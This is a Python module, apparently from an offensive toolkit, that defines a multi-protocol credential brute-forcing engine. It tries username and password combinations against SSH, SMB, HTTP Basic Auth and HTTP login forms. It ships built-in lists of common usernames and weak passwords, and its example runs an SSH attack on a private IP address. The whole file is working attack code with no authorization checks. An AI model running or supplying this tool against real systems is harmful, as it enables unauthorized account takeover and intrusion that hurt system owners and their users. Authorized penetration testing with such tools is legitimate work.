"""Module Bruteforce - SSH, SMB, HTTP bruteforce attacks"""
import time
import socket
import threading
from typing import Dict, List, Optional
try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    from smb.SMBConnection import SMBConnection
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

import requests
from requests.auth import HTTPBasicAuth


class BruteforceEngine:
    """Engine pour bruteforce multi-protocoles"""
    
    def __init__(self, delay: float = 0.5, timeout: int = 5, max_threads: int = 10):
        """
        Initialize bruteforce engine
        
        Args:
            delay: Delay between attempts (seconds)
            timeout: Connection timeout (seconds)
            max_threads: Maximum concurrent threads
        """
        self.delay = delay
        self.timeout = timeout
        self.max_threads = max_threads
        self.results = []
        self.lock = threading.Lock()
    
    def ssh_bruteforce(self, ip: str, usernames: List[str], passwords: List[str], port: int = 22) -> Dict:
        """
        SSH bruteforce attack
        
        Args:
            ip: Target IP
            usernames: List of usernames to try
            passwords: List of passwords to try
            port: SSH port
        
        Returns:
            Dict with success status, credentials if found
        """
        if not SSH_AVAILABLE:
            return {'success': False, 'error': 'paramiko not available'}
        
        print(f"[Bruteforce] Starting SSH bruteforce on {ip}:{port}")
        print(f"[Bruteforce] Testing {len(usernames)} usernames Ã— {len(passwords)} passwords = {len(usernames) * len(passwords)} combinations")
        
        start_time = time.time()
        attempts = 0
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    ssh.connect(
                        ip,
                        port=port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False
                    )
                    
                    # Success!
                    ssh.close()
                    
                    elapsed = time.time() - start_time
                    
                    print(f"[Bruteforce] SSH success! {username}:{password} on {ip}:{port}")
                    
                    return {
                        'success': True,
                        'protocol': 'ssh',
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'attempts': attempts,
                        'time_elapsed': elapsed
                    }
                
                except paramiko.AuthenticationException:
                    # Wrong credentials, continue
                    pass
                except Exception as e:
                    # Connection error, might want to stop
                    print(f"[Bruteforce] SSH connection error: {e}")
                
                time.sleep(self.delay)
        
        elapsed = time.time() - start_time
        print(f"[Bruteforce] SSH bruteforce failed after {attempts} attempts ({elapsed:.1f}s)")
        
        return {
            'success': False,
            'protocol': 'ssh',
            'ip': ip,
            'port': port,
            'attempts': attempts,
            'time_elapsed': elapsed
        }
    
    def smb_bruteforce(self, ip: str, usernames: List[str], passwords: List[str], domain: str = '') -> Dict:
        """
        SMB bruteforce attack
        
        Args:
            ip: Target IP
            usernames: List of usernames to try
            passwords: List of passwords to try
            domain: Windows domain (optional)
        
        Returns:
            Dict with success status, credentials if found
        """
        if not SMB_AVAILABLE:
            return {'success': False, 'error': 'pysmb not available'}
        
        print(f"[Bruteforce] Starting SMB bruteforce on {ip}")
        
        start_time = time.time()
        attempts = 0
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    conn = SMBConnection(
                        username,
                        password,
                        'attacker',
                        ip,
                        domain=domain,
                        use_ntlm_v2=True
                    )
                    
                    if conn.connect(ip, timeout=self.timeout):
                        # Success!
                        conn.close()
                        
                        elapsed = time.time() - start_time
                        
                        print(f"[Bruteforce] SMB success! {username}:{password} on {ip}")
                        
                        return {
                            'success': True,
                            'protocol': 'smb',
                            'ip': ip,
                            'username': username,
                            'password': password,
                            'domain': domain,
                            'attempts': attempts,
                            'time_elapsed': elapsed
                        }
                
                except Exception:
                    # Wrong credentials or connection error
                    pass
                
                time.sleep(self.delay)
        
        elapsed = time.time() - start_time
        print(f"[Bruteforce] SMB bruteforce failed after {attempts} attempts ({elapsed:.1f}s)")
        
        return {
            'success': False,
            'protocol': 'smb',
            'ip': ip,
            'attempts': attempts,
            'time_elapsed': elapsed
        }
    
    def http_basic_bruteforce(self, url: str, usernames: List[str], passwords: List[str]) -> Dict:
        """
        HTTP Basic Auth bruteforce
        
        Args:
            url: Target URL
            usernames: List of usernames to try
            passwords: List of passwords to try
        
        Returns:
            Dict with success status, credentials if found
        """
        print(f"[Bruteforce] Starting HTTP Basic Auth bruteforce on {url}")
        
        start_time = time.time()
        attempts = 0
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    response = requests.get(
                        url,
                        auth=HTTPBasicAuth(username, password),
                        timeout=self.timeout,
                        allow_redirects=False
                    )
                    
                    if response.status_code == 200:
                        # Success!
                        elapsed = time.time() - start_time
                        
                        print(f"[Bruteforce] HTTP Basic Auth success! {username}:{password} on {url}")
                        
                        return {
                            'success': True,
                            'protocol': 'http_basic',
                            'url': url,
                            'username': username,
                            'password': password,
                            'attempts': attempts,
                            'time_elapsed': elapsed
                        }
                
                except requests.exceptions.RequestException:
                    pass
                
                time.sleep(self.delay)
        
        elapsed = time.time() - start_time
        print(f"[Bruteforce] HTTP Basic Auth bruteforce failed after {attempts} attempts ({elapsed:.1f}s)")
        
        return {
            'success': False,
            'protocol': 'http_basic',
            'url': url,
            'attempts': attempts,
            'time_elapsed': elapsed
        }
    
    def http_form_bruteforce(self, url: str, username_field: str, password_field: str, 
                            usernames: List[str], passwords: List[str],
                            success_indicator: str = None) -> Dict:
        """
        HTTP Form bruteforce
        
        Args:
            url: Target login form URL
            username_field: Username field name
            password_field: Password field name
            usernames: List of usernames to try
            passwords: List of passwords to try
            success_indicator: String that indicates successful login (in response)
        
        Returns:
            Dict with success status, credentials if found
        """
        print(f"[Bruteforce] Starting HTTP Form bruteforce on {url}")
        
        start_time = time.time()
        attempts = 0
        
        for username in usernames:
            for password in passwords:
                attempts += 1
                
                try:
                    data = {
                        username_field: username,
                        password_field: password
                    }
                    
                    response = requests.post(
                        url,
                        data=data,
                        timeout=self.timeout,
                        allow_redirects=True
                    )
                    
                    # Check for success
                    if success_indicator:
                        success = success_indicator in response.text
                    else:
                        # Default: check for common error messages
                        error_indicators = ['incorrect', 'invalid', 'wrong', 'failed', 'error']
                        success = not any(err in response.text.lower() for err in error_indicators)
                    
                    if success:
                        elapsed = time.time() - start_time
                        
                        print(f"[Bruteforce] HTTP Form success! {username}:{password} on {url}")
                        
                        return {
                            'success': True,
                            'protocol': 'http_form',
                            'url': url,
                            'username': username,
                            'password': password,
                            'attempts': attempts,
                            'time_elapsed': elapsed
                        }
                
                except requests.exceptions.RequestException:
                    pass
                
                time.sleep(self.delay)
        
        elapsed = time.time() - start_time
        print(f"[Bruteforce] HTTP Form bruteforce failed after {attempts} attempts ({elapsed:.1f}s)")
        
        return {
            'success': False,
            'protocol': 'http_form',
            'url': url,
            'attempts': attempts,
            'time_elapsed': elapsed
        }
    
    @staticmethod
    def load_wordlist(filepath: str) -> List[str]:
        """Load wordlist from file"""
        try:
            with open(filepath, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[Bruteforce] Wordlist not found: {filepath}")
            return []
    
    @staticmethod
    def get_common_usernames() -> List[str]:
        """Get list of common usernames"""
        return [
            'admin', 'administrator', 'root', 'user', 'test',
            'guest', 'info', 'adm', 'mysql', 'postgres',
            'oracle', 'ftp', 'pi', 'puppet', 'ansible',
            'vagrant', 'azureuser', 'ec2-user', 'ubuntu'
        ]
    
    @staticmethod
    def get_common_passwords() -> List[str]:
        """Get list of common passwords"""
        return [
            'password', '123456', '12345678', 'admin', 'root',
            'Password1', 'Password123', 'password123', 'admin123', 'root123',
            'qwerty', 'abc123', 'letmein', 'welcome', 'monkey',
            '1234567890', 'password1', 'Password1!', 'P@ssw0rd', 'P@ssword123'
        ]


# Example usage
if __name__ == '__main__':
    bruteforce = BruteforceEngine(delay=0.5)
    
    # SSH bruteforce
    usernames = BruteforceEngine.get_common_usernames()
    passwords = BruteforceEngine.get_common_passwords()
    
    result = bruteforce.ssh_bruteforce('192.168.1.100', usernames[:5], passwords[:5])
    print(f"\nResult: {result}")
